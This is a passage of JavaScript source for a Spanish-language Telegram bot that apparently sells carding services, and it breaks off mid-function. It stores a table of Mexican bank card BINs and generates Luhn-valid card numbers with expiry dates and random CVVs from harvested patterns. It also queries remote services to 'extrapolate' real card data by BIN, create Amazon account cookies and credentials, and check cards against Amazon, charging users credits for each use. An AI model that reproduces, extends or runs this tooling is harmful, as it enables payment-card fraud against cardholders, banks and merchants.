// ============================================
// BOT DE TELEGRAM - VERSIÓN DEFINITIVA CORREGIDA
// ============================================

const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');

// ========== CONFIGURACIÓN ==========
const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN no configurado');
    process.exit(1);
}

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const INTERNAL_API_URL = process.env.INTERNAL_API_URL || 'http://basedatos:8080/api';
const BOT_API_KEY = process.env.BOT_API_KEY || 'AALOL23894238HWKEJSNFSDGF';
const API_GENCOOKIE_URL = process.env.API_GENCOOKIE_URL || 'https://p01--gencookie--7ppzd7xy487n.code.run';
const API_EXTRAPOLADOR_URL = process.env.API_EXTRAPOLADOR_URL || 'https://p01--extrapolador--7ppzd7xy487n.code.run';
const API_AMAZON_CHECK_URL = process.env.API_AMAZON_CHECK_URL || 'https://p01--amazonchk--vwr6mdxp7dhn.code.run/api/check-card';
const API_LATTICE_URL = process.env.API_LATTICE_URL || 'https://api.lattice.com/check';
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;

const bot = new TelegramBot(token, { polling: true });
console.log('🤖 Bot de Telegram mejorado iniciado');

// ========== SEPARADORES BONITOS ==========
const SEPARATORS = [
    '𓆝 𓆟 𓆞 𓆝 𓆟𓆝 𓆟 𓆞 𓆝 𓆟𓆝 𓆟 𓆞 𓆝 𓆟𓆝 𓆟 𓆞 𓆝 𓆟',
    '⋆｡‧˚ʚ🍓ɞ˚‧｡⋆⋆｡‧˚ʚ🍓ɞ˚‧｡⋆⋆｡‧˚ʚ🍓ɞ˚‧｡⋆⋆｡‧˚ʚ🍓ɞ˚‧｡⋆⋆｡‧˚ʚ🍓ɞ˚‧｡⋆',
    '𓆩༺✧༻𓆪  𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪 𓆩༺✧༻𓆪',
    '𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆𝄞⨾💿✮˚.⋆',
    '🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･🪼⋆.ೃ࿔*:･',
    'ᥫ᭡.🍥⋆🐇་༘🌷.ೃ࿔ᥫ᭡.🍥⋆🐇་༘🌷.ೃ࿔ᥫ᭡.🍥⋆🐇་༘🌷.ೃ࿔ᥫ᭡.🍥⋆🐇་༘🌷.ೃ࿔',
    '✨🌟⭐✨🌟⭐✨🌟⭐✨🌟⭐✨🌟⭐✨🌟⭐✨🌟⭐',
    '🌸🌼🌻🌸🌼🌻🌸🌼🌻🌸🌼🌻🌸🌼🌻🌸🌼🌻🌸🌼🌻',
    '🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖🎀💖',
    '🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨🔮✨'
];

// Diccionario local de bins por banco
const bankBins = {
    // BBVA / Bancomer
    bbva: ['415231', '481515', '481514', '481516', '481283'],
    bancomer: ['415231', '481515', '481514', '481516', '481283'],
    // Bancoppel
    bancoppel: ['426807', '416916'],
    // Santander
    santander: ['557910', '557907'],
    // Banamex (Citibanamex)
    banamex: ['549949', '528843', '554625'],
    citibanamex: ['549949', '528843', '554625'],
    // HSBC
    hsbc: ['491089', '421316'],
    // Azteca
    azteca: ['402766'],
    // Banorte
    banorte: ['418914', '493173', '493158', '491566']
};

function getBinForBank(bankName) {
    const name = bankName.toLowerCase().trim();
    for (const [key, bins] of Object.entries(bankBins)) {
        if (name.includes(key)) {
            const randomIndex = Math.floor(Math.random() * bins.length);
            return bins[randomIndex];
        }
    }
    return null; // Si no encuentra, devuelve null (no se asigna por defecto)
}

// ========== GESTIÓN DE ESTADOS ==========
const userStates = new Map();

function setUserState(telegramId, state) {
    if (userStates.has(telegramId)) clearTimeout(userStates.get(telegramId).timeout);
    const timeout = setTimeout(() => {
        if (userStates.get(telegramId)?.step) {
            userStates.delete(telegramId);
            bot.sendMessage(telegramId, '⏰ Tiempo de espera agotado.').catch(() => {});
        }
    }, 300000);
    userStates.set(telegramId, { ...state, timeout });
}

function clearUserState(telegramId) {
    const state = userStates.get(telegramId);
    if (state?.timeout) clearTimeout(state.timeout);
    userStates.delete(telegramId);
}

// ========== FUNCIONES DE BASE DE DATOS ==========
async function getUserByTelegramId(telegramId) {
    const res = await pool.query(
        'SELECT id, username, credits, days_remaining, cookie FROM users WHERE telegram_id = $1',
        [telegramId]
    );
    return res.rows[0];
}

async function upsertUser(telegramId, username, chatId, chatType) {
    if (chatType !== 'private') return;
    const now = new Date();
    const client = await pool.connect();
    try {
        await client.query('BEGIN');
        await client.query(`UPDATE users SET telegram_chat_id = NULL WHERE telegram_chat_id = $1`, [chatId]);
        const existing = await client.query('SELECT id FROM users WHERE telegram_id = $1', [telegramId]);
        if (existing.rows.length > 0) {
            await client.query(
                `UPDATE users SET telegram_chat_id = $1, telegram_username = $2, updated_at = $3 WHERE telegram_id = $4`,
                [chatId, username, now, telegramId]
            );
        } else {
            const byUsername = await client.query('SELECT id FROM users WHERE username = $1', [username]);
            if (byUsername.rows.length > 0) {
                await client.query(
                    `UPDATE users SET telegram_id = $1, telegram_chat_id = $2, telegram_username = $3, updated_at = $4 WHERE username = $5`,
                    [telegramId, chatId, username, now, username]
                );
            } else {
                await client.query(
                    `INSERT INTO users (telegram_id, telegram_username, telegram_chat_id, username, created_at) VALUES ($1, $2, $3, $4, $5)`,
                    [telegramId, username, chatId, username, now]
                );
            }
        }
        await client.query('COMMIT');
    } catch (error) {
        await client.query('ROLLBACK');
        console.error('Error en upsertUser:', error);
    } finally {
        client.release();
    }
}

async function updateUserCookie(telegramId, cookie) {
    await pool.query(`UPDATE users SET cookie = $1 WHERE telegram_id = $2`, [cookie, telegramId]);
}

async function deductCredits(telegramId, amount = 4) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 30000);
        const response = await fetch(`${INTERNAL_API_URL}/user/bot/use-credits`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegram_id: telegramId, amount, bot_key: BOT_API_KEY }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (data.success) {
            return { newCredits: data.newCredits, creditsZero: data.credits_zero || false, role: data.role };
        }
        return null;
    } catch (error) {
        console.error('Error en deductCredits:', error);
        return null;
    }
}

async function checkAndKickIfNoDaysOrCredits(telegramId, chatId, requiredCredits = 0) {
    const user = await getUserByTelegramId(telegramId);
    if (!user) {
        await sendSafeMessage(chatId, '❌ Usa /start primero.');
        return false;
    }
    if (user.days_remaining <= 0) {
        if (GROUP_CHAT_ID) await bot.telegram.kickChatMember(GROUP_CHAT_ID, telegramId).catch(() => {});
        await sendSafeMessage(chatId, '❌ Tus días han expirado. Has sido expulsado del grupo.');
        return false;
    }
    if (requiredCredits > 0 && user.credits < requiredCredits) {
        await sendSafeMessage(chatId, `❌ Créditos insuficientes. Necesitas: ${requiredCredits}.`);
        return false;
    }
    return true;
}

async function kickUserFromGroup(telegramUserId) {
    if (!GROUP_CHAT_ID) return false;
    try {
        await bot.telegram.kickChatMember(GROUP_CHAT_ID, telegramUserId);
        console.log(`✅ Usuario ${telegramUserId} expulsado del grupo`);
        return true;
    } catch (error) {
        console.error(`❌ Error expulsando a ${telegramUserId}:`, error.message);
        return false;
    }
}

// ========== FUNCIONES DE UTILIDAD ==========
async function sendSafeMessage(chatId, text, options = {}) {
    try {
        return await bot.sendMessage(chatId, text, options);
    } catch (error) {
        if (options.parse_mode) {
            delete options.parse_mode;
            try { return await bot.sendMessage(chatId, text, options); } catch (e) {}
        }
        return null;
    }
}

function calcularDigitoLuhn(numeroParcial) {
    let suma = 0, esPar = true;
    for (let i = numeroParcial.length - 1; i >= 0; i--) {
        let digito = parseInt(numeroParcial[i]);
        if (esPar) {
            digito *= 2;
            if (digito > 9) digito -= 9;
        }
        suma += digito;
        esPar = !esPar;
    }
    return (10 - (suma % 10)) % 10;
}

function limpiarTarjetas(textoSucio) {
    const textoLimpio = textoSucio
        .replace(/[\u200b\u2060\u200C\u200D\uFEFF]/g, '')
        .replace(/\s+/g, ' ')
        .replace(/\[.*?\]/g, '')
        .replace(/\(.*?\)/g, '')
        .trim();
    const patron = /(\d{16})\s*[|│]\s*(\d{2})\s*[|│]\s*(\d{4})\s*[|│]\s*(\d{3})/g;
    const tarjetas = [];
    let match;
    while ((match = patron.exec(textoLimpio)) !== null) {
        const [_, num, mes, año, cvv] = match;
        if (num.length === 16 && mes.length === 2 && año.length === 4 && cvv.length === 3) {
            tarjetas.push(`${num}|${mes}|${año}|${cvv}`);
        }
    }
    return [...new Set(tarjetas)];
}

function normalizarExtra(texto) {
    let temp = texto.trim();
    temp = temp.replace(/[ /-]+/g, '|');
    if (!temp.includes('|')) {
        const match = temp.match(/^([0-9X]{6,16})(\d{2})(\d{2,4})(\d{0,3})?$/);
        if (match) {
            let [, numBase, mes, año, cvv] = match;
            año = año.length === 2 ? '20' + año : año;
            return `${numBase}|${mes}|${año}|${cvv || 'rnd'}`;
        }
    }
    const partes = temp.split('|').map(p => p.trim());
    if (partes.length >= 3) {
        let [numBase, mes, año, cvv] = partes;
        mes = mes.padStart(2, '0');
        año = año.length === 2 ? '20' + año : año;
        return `${numBase}|${mes}|${año}|${cvv || 'rnd'}`;
    }
    return temp;
}

function generarTarjetasDesdePatron(patron, cantidad = 10) {
    let normalizado = patron.trim().replace(/[ /-]+/g, '|');
    if (!normalizado.includes('|') && /[0-9X]{6,16}\d{4,6}/.test(normalizado)) {
        let match = normalizado.match(/^([0-9X]{6,16})(\d{2})(\d{2,4})(\d{0,3})?$/);
        if (match) {
            let [, numBase, mes, año, cvv] = match;
            año = año.length === 2 ? '20' + año : año;
            normalizado = `${numBase}|${mes}|${año}|${cvv || 'rnd'}`;
        }
    }
    const partes = normalizado.split('|');
    if (partes.length < 3) throw new Error('Formato inválido. Usa: NUMERO|MES|AÑO|CVV');
    let [numBase, mes, año, cvv] = partes;
    mes = mes.padStart(2, '0').slice(0, 2);
    if (isNaN(parseInt(mes)) || parseInt(mes) < 1 || parseInt(mes) > 12) throw new Error('Mes inválido (01-12)');
    año = año.trim();
    if (año.length === 2) año = '20' + año;
    if (año.length !== 4 || isNaN(parseInt(año))) throw new Error('Año inválido (YYYY o YY)');
    numBase = numBase.toUpperCase();
    if (numBase.length > 16) numBase = numBase.substring(0, 16);
    if (numBase.length < 16) numBase = numBase + 'X'.repeat(16 - numBase.length);
    if (!/^[0-9X]+$/.test(numBase)) throw new Error('Solo dígitos y X');
    const tarjetas = [];
    for (let i = 0; i < cantidad; i++) {
        let numeroConX = '';
        for (let char of numBase) numeroConX += char === 'X' ? Math.floor(Math.random() * 10).toString() : char;
        const primeros15 = numeroConX.slice(0, 15);
        const digitoControl = calcularDigitoLuhn(primeros15);
        const numeroCompleto = primeros15 + digitoControl;
        let cvvGen = (cvv && cvv.toLowerCase() !== 'rnd') ? cvv.slice(0, 3) : Math.floor(100 + Math.random() * 900).toString();
        if (!/^\d{3}$/.test(cvvGen)) cvvGen = Math.floor(100 + Math.random() * 900).toString();
        tarjetas.push(`${numeroCompleto}|${mes}|${año}|${cvvGen}`);
    }
    return tarjetas;
}

// ========== COMANDOS ==========
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from;
    const telegramId = from.id;
    const username = from.username || telegramId.toString();
    const firstName = from.first_name || '';
    const chatType = msg.chat.type;
    try {
        const existing = await getUserByTelegramId(telegramId);
        const isNew = !existing;
        await upsertUser(telegramId, username, chatId, chatType);
        if (isNew) {
            await sendSafeMessage(chatId,
                `👋 ¡Hola ${firstName}! 👋\n\n` +
                `He guardado tu Chat ID: <code>${telegramId}</code>\n\n` +
                `Regístrate en la web: https://astralchk.com/login.html con usuario @${username}\n` +
                `Recibirás un código aquí.`, { parse_mode: 'HTML' });
        } else {
            await sendSafeMessage(chatId,
                `👋 ¡Hola ${firstName}!\n💰 Créditos: ${existing.credits}\n📅 Días: ${existing.days_remaining}\n\n` +
                `Usa /menu para ver comandos.`, { parse_mode: 'Markdown' });
        }
    } catch (error) {
        console.error(error);
        await sendSafeMessage(chatId, '❌ Error interno.');
    }
});

// /binlist y alias (ahora usa el diccionario local)
bot.onText(/^\/(?:binlist|bins|list|binl|bnl)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let query = match[1];
    if (!query) {
        setUserState(telegramId, { step: 'awaiting_binlist_query' });
        return sendSafeMessage(chatId, '🏦 Ingresa el nombre de un banco o país:');
    }
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 0)) return;
    await sendSafeMessage(chatId, `🔍 Buscando bins para: ${query}...`);
    
    const nameKey = query.toLowerCase().trim();
    let binsEncontrados = [];
    for (const [key, bins] of Object.entries(bankBins)) {
        if (nameKey.includes(key)) {
            binsEncontrados = bins;
            break;
        }
    }
    if (binsEncontrados.length === 0) {
        // Si no se encuentra, mostrar bins genéricos de México
        binsEncontrados = ['415231', '426807', '557910', '549949', '481515'];
    }
    const binsUnicos = [...new Set(binsEncontrados)];
    let msgText = `📋 *Bins encontrados para ${query}:*\n\n💳 Lista de bins:\n${binsUnicos.join(', ')}`;
    await sendSafeMessage(chatId, msgText, { parse_mode: 'Markdown' });
    clearUserState(telegramId);
});

// /extrapolador y alias
bot.onText(/^\/(?:extrapolador|extrapolado|extrapolad|extrapolar|extrapola|extrapol|extrapo|extrap|extras|extra|expo|exp|ext|xtr|xtrp|scrapper|scrapp|scrp)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let input = match[1];
    if (!input) {
        setUserState(telegramId, { step: 'awaiting_extrapolador_input' });
        return sendSafeMessage(chatId, '🔢 Envía un BIN de 6 dígitos, nombre de banco o país:');
    }
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 10)) return;
    
    let bin = input;
    if (!/^\d{6}$/.test(input)) {
        await sendSafeMessage(chatId, `🔍 Obteniendo bins de ${input}...`);
        const binElegido = getBinForBank(input);
        if (!binElegido) throw new Error('No se encontraron bins para ese banco');
        bin = binElegido;
        await sendSafeMessage(chatId, `✅ Usando BIN: ${bin}`);
    }
    await sendSafeMessage(chatId, `🔮 Extrapolando para BIN ${bin}...`);
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 60000);
        const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ bin }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        if (!data.success || !data.data || data.data.length === 0) throw new Error('Sin resultados');
        const patrones = {};
        for (const tarjeta of data.data) {
            const partes = tarjeta.split('|');
            if (partes.length < 3) continue;
            const numero = partes[0];
            const mes = partes[1];
            const año = partes[2];
            if (numero.length !== 16) continue;
            const prefix = numero.slice(0, 12);
            const clave = `${prefix}xxxx|${mes}|${año}`;
            patrones[clave] = (patrones[clave] || 0) + 1;
        }
        if (Object.keys(patrones).length === 0) throw new Error('No se extrajeron patrones');
        const muy = [], mod = [], uni = [];
        for (const [patron, count] of Object.entries(patrones)) {
            if (count >= 3) muy.push({ patron, count });
            else if (count === 2) mod.push({ patron, count });
            else uni.push({ patron, count });
        }
        muy.sort((a,b) => b.count - a.count);
        mod.sort((a,b) => b.count - a.count);
        uni.sort((a,b) => b.count - a.count);
        let mensaje = `=== EXTRAPOLADOR - RESULTADOS ===\n\n`;
        if (muy.length) {
            mensaje += `🟢 MUY REPETIDOS (${muy.length}):\n`;
            for (const p of muy.slice(0,15)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} veces)\n`;
            }
            mensaje += `\n`;
        }
        if (mod.length) {
            mensaje += `🟡 MODERADOS (${mod.length}):\n`;
            for (const p of mod.slice(0,15)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} veces)\n`;
            }
            mensaje += `\n`;
        }
        if (uni.length) {
            mensaje += `🔴 ÚNICOS (${uni.length}):\n`;
            for (const p of uni.slice(0,20)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} vez)\n`;
            }
        }
        if (mensaje.length > 4090) mensaje = mensaje.substring(0,4000) + "\n...";
        await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });
        const creditResult = await deductCredits(telegramId, 10);
        if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});

// /gen y alias - VERSIÓN CORREGIDA
bot.onText(/^\/(?:generadorccs|genccs|gen|gncc)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let fullParam = match[1];
    if (!fullParam) {
        setUserState(telegramId, { step: 'awaiting_gen_param' });
        return sendSafeMessage(chatId, '🎴 Envía un extra (ej. 481515310022xxxx|09|2029), un BIN de 6 dígitos, o un banco/pais');
    }
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 4)) return;

    // Extraer cantidad opcional
    let cantidad = 10;
    let input = fullParam;
    const cantMatch = input.match(/\s+(\d+)$/);
    if (cantMatch) {
        cantidad = parseInt(cantMatch[1]);
        if (cantidad > 50) cantidad = 50;
        input = input.substring(0, cantMatch.index);
    }

    // Detección simple
    const tieneX = /[Xx]/.test(input);
    const tieneFecha = /\d{1,2}[\/\-|]\d{2,4}/.test(input);
    const esExtra = tieneX && tieneFecha;
    const esBin = /^\d{6}$/.test(input.trim());
    const esBanco = !esExtra && !esBin;

    try {
        if (esExtra) {
            let normalized = input.trim().replace(/[ /-]+/g, '|');
            normalized = normalized.replace(/\|+/g, '|');
            const partes = normalized.split('|');
            if (partes.length >= 3) {
                let [numBase, mes, año, cvv] = partes;
                if (año.length === 2) año = '20' + año;
                if (!cvv) cvv = 'rnd';
                normalized = `${numBase}|${mes}|${año}|${cvv}`;
            }
            const tarjetas = generarTarjetasDesdePatron(normalized, cantidad);
            const lista = tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n');
            const resto = tarjetas.length > 20 ? `\n... y ${tarjetas.length-20} más` : '';
            await sendSafeMessage(chatId, `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${lista}${resto}`, { parse_mode: 'Markdown' });
        }
        else if (esBin) {
            await sendSafeMessage(chatId, `🔮 Extrapolando BIN ${input}...`);
            const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bin: input })
            });
            const data = await response.json();
            if (!data.success || !data.data || !data.data.length) throw new Error('No se encontraron tarjetas para ese BIN');

            const patrones = {};
            for (const tarjeta of data.data) {
                const partes = tarjeta.split('|');
                if (partes.length < 3) continue;
                const num = partes[0];
                if (num.length !== 16) continue;
                const pref = num.slice(0,12);
                const clave = `${pref}xxxx|${partes[1]}|${partes[2]}`;
                patrones[clave] = (patrones[clave] || 0) + 1;
            }
            if (Object.keys(patrones).length === 0) throw new Error('No se extrajeron patrones');

            const items = Object.entries(patrones).map(([p,c]) => ({ patron: p, count: c }));
            const muy = items.filter(i => i.count >= 3).sort((a,b)=>b.count-a.count);
            const mod = items.filter(i => i.count === 2).sort((a,b)=>b.count-a.count);
            const uni = items.filter(i => i.count === 1).sort((a,b)=>b.count-a.count);
            const mejor = muy[0] || mod[0] || uni[0];
            if (!mejor) throw new Error('No se encontró patrón');
            const [prefijo, mes, año] = mejor.patron.split('|');
            const extraElegido = `${prefijo}xxxx|${mes}|${año}|rnd`;

            let mensaje = `=== EXTRAPOLACIÓN COMPLETADA ===\n✅ EXTRA A GENERAR: \`${prefijo}xxxx | ${mes}/${año}\` | (${mejor.count} veces)\n\n`;
            if (muy.length) {
                mensaje += `🟢 MUY REPETIDOS (${muy.length}):\n`;
                for (let p of muy.slice(0,10)) {
                    const [pf, m, a] = p.patron.split('|');
                    mensaje += `${pf}xxxx | ${m}/${a} | (${p.count} veces)\n`;
                }
                if (muy.length>10) mensaje += `... y ${muy.length-10} más.\n`;
                mensaje += `\n`;
            }
            if (mod.length) {
                mensaje += `🟡 MODERADOS (${mod.length}):\n`;
                for (let p of mod.slice(0,5)) {
                    const [pf, m, a] = p.patron.split('|');
                    mensaje += `${pf}xxxx | ${m}/${a} | (${p.count} veces)\n`;
                }
                if (mod.length>5) mensaje += `... y ${mod.length-5} más.\n`;
                mensaje += `\n`;
            }
            if (uni.length) {
                mensaje += `🔴 ÚNICOS (${uni.length}):\n`;
                for (let p of uni.slice(0,10)) {
                    const [pf, m, a] = p.patron.split('|');
                    mensaje += `${pf}xxxx | ${m}/${a} | (${p.count} vez)\n`;
                }
                if (uni.length>10) mensaje += `... y ${uni.length-10} más.\n`;
            }
            await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });

            const tarjetas = generarTarjetasDesdePatron(extraElegido, cantidad);
            const lista = tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n');
            const resto = tarjetas.length > 20 ? `\n... y ${tarjetas.length-20} más` : '';
            await sendSafeMessage(chatId, `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${lista}${resto}`, { parse_mode: 'Markdown' });
        }
        else {
            // BANCO
            await sendSafeMessage(chatId, `🔍 Buscando bins de "${input}"...`);
            const binElegido = getBinForBank(input);
            if (!binElegido) throw new Error('No se encontraron bins para ese banco');
            await sendSafeMessage(chatId, `✅ BIN elegido: ${binElegido}`);
            // Reenviar como BIN
            const fakeMsg = { ...msg, text: `/gen ${binElegido} ${cantidad}` };
            bot.emit('text', fakeMsg);
            return;
        }

        const creditResult = await deductCredits(telegramId, 4);
        if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
    } catch (error) {
        console.error('Error en /gen:', error);
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});

// /gencookie
bot.onText(/^\/(?:gencookie|gencuki|genck|gnck)(?:\s+(\w+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let country = match[1] ? match[1].toUpperCase() : null;
    if (!country) {
        setUserState(telegramId, { step: 'awaiting_gencookie_country' });
        return sendSafeMessage(chatId, '🌎 ¿País? (MX, US, CA, UK, DE, FR, IT, ES, JP, AU, IN)');
    }
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 4)) return;
    const paises = ['MX','US','CA','UK','DE','FR','IT','ES','JP','AU','IN'];
    if (!paises.includes(country)) return sendSafeMessage(chatId, '❌ País inválido.');
    await sendSafeMessage(chatId, `🔄 Generando cookie para ${country}...`);
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 300000);
        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country, add_address: true }), signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (!data.success) throw new Error(data.error || 'Error');
        const { phone, password, cookie_string, country: ctry } = data.data;
        await updateUserCookie(telegramId, cookie_string);
        const creditResult = await deductCredits(telegramId, 4);
        let msgText = `🍪 *Cookie ${ctry}*\n📞 Tel: \`${phone}\`\n🔑 Pass: \`${password}\`\n🍪 Cookie guardada.`;
        if (creditResult) msgText += `\n💰 Créditos restantes: ${creditResult.newCredits}`;
        if (creditResult?.creditsZero) await kickUserFromGroup(telegramId);
        await sendSafeMessage(chatId, msgText, { parse_mode: 'Markdown' });
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});

// /setcookie
bot.onText(/^\/(?:setcookie|setcuki|stck|sck|setck|addcookie|addcuki|addck|dck|ack)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let cookie = match[1];
    if (!cookie) {
        setUserState(telegramId, { step: 'awaiting_setcookie' });
        return sendSafeMessage(chatId, '🍪 Envía la cookie:');
    }
    await updateUserCookie(telegramId, cookie);
    await sendSafeMessage(chatId, '✅ Cookie guardada.');
    clearUserState(telegramId);
});

// /amazon (ahora también soporta nombres de banco)
bot.onText(/^\/(?:amazon|amz)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const user = await getUserByTelegramId(telegramId);
    if (!user) return sendSafeMessage(chatId, '❌ Usa /start primero.');
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 0)) return;
    let cookie = user.cookie;
    if (!cookie) {
        const ask = await sendSafeMessage(chatId, '🔑 No tienes cookie. ¿Generar nueva? (4 créditos)\nResponde "si" o "no".', {
            reply_markup: { inline_keyboard: [[{ text: '✅ Sí', callback_data: 'gencookie_for_amazon' }]] }
        });
        const respuesta = await new Promise(resolve => {
            const handler = (resp) => {
                if (resp.chat.id === chatId && (resp.text?.toLowerCase() === 'si' || resp.text?.toLowerCase() === 'no')) {
                    bot.removeListener('message', handler);
                    resolve(resp.text.toLowerCase());
                }
            };
            bot.on('message', handler);
            setTimeout(() => resolve(null), 60000);
        });
        if (respuesta !== 'si') return sendSafeMessage(chatId, '❌ Cancelado.');
        await sendSafeMessage(chatId, '🔄 Generando cookie...');
        try {
            const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true })
            });
            const data = await response.json();
            if (!data.success) throw new Error('Error');
            cookie = data.data.cookie_string;
            await updateUserCookie(telegramId, cookie);
            const creditResult = await deductCredits(telegramId, 4);
            if (!creditResult) throw new Error('Fallo descuento');
            await sendSafeMessage(chatId, `✅ Cookie generada. Créditos: ${creditResult.newCredits}`);
        } catch (err) {
            return sendSafeMessage(chatId, `❌ Error: ${err.message}`);
        }
    }
    let param = match[1];
    if (!param) {
        setUserState(telegramId, { step: 'awaiting_amazon_cards' });
        return sendSafeMessage(chatId, '💳 Envía tarjetas, patrón, BIN o nombre de banco:');
    }
    // Detectar si es nombre de banco (no es bin, no es extra)
    const esBin = /^\d{6}$/.test(param);
    let normalizedParam = normalizarExtra(param);
    const esExtra = normalizedParam.includes('|') && /[0-9X]+\|\d{1,2}\|\d{2,4}/.test(normalizedParam);
    const esBanco = !esBin && !esExtra;
    
    try {
        let tarjetas = [];
        if (esBin) {
            await sendSafeMessage(chatId, `🔮 Extrapolando BIN ${param}...`);
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 60000);
            const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bin: param }), signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await response.json();
            if (!data.success || !data.data.length) throw new Error('Sin resultados');
            const patrones = {};
            for (const tarjeta of data.data) {
                const partes = tarjeta.split('|');
                if (partes.length < 3) continue;
                const numero = partes[0];
                if (numero.length !== 16) continue;
                const prefix = numero.slice(0,12);
                const clave = `${prefix}xxxx|${partes[1]}|${partes[2]}`;
                patrones[clave] = (patrones[clave] || 0) + 1;
            }
            const ordenados = Object.entries(patrones).map(([p,c]) => ({ patron: p, count: c })).sort((a,b) => b.count - a.count);
            const mejor = ordenados[0];
            const [prefix, mes, año] = mejor.patron.split('|');
            const extraElegido = `${prefix}xxxx|${mes}|${año}|rnd`;
            let mensajeResumen = `=== EXTRAPOLACIÓN COMPLETADA ===\n✅ EXTRA A CHECAR: \`${prefix}xxxx | ${mes}/${año}\` | (${mejor.count} veces)\n\n`;
            const muy = ordenados.filter(p => p.count >= 3).slice(0,10);
            const mod = ordenados.filter(p => p.count === 2).slice(0,5);
            const uni = ordenados.filter(p => p.count === 1).slice(0,10);
            if (muy.length) mensajeResumen += `🟢 MUY REPETIDOS:\n${muy.map(p => p.patron.split('|').slice(0,2).join(' | ') + ` (${p.count} veces)`).join('\n')}\n\n`;
            if (mod.length) mensajeResumen += `🟡 MODERADOS:\n${mod.map(p => p.patron.split('|').slice(0,2).join(' | ') + ` (${p.count} veces)`).join('\n')}\n\n`;
            if (uni.length) mensajeResumen += `🔴 ÚNICOS:\n${uni.map(p => p.patron.split('|').slice(0,2).join(' | ') + ` (${p.count} vez)`).join('\n')}`;
            await sendSafeMessage(chatId, mensajeResumen, { parse_mode: 'Markdown' });
            tarjetas = generarTarjetasDesdePatron(extraElegido, 20);
            let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n')}`;
            await sendSafeMessage(chatId, lista, { parse_mode: 'Markdown' });
        } else if (esExtra) {
            tarjetas = generarTarjetasDesdePatron(normalizedParam, 20);
            let lista = `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n')}`;
            await sendSafeMessage(chatId, lista, { parse_mode: 'Markdown' });
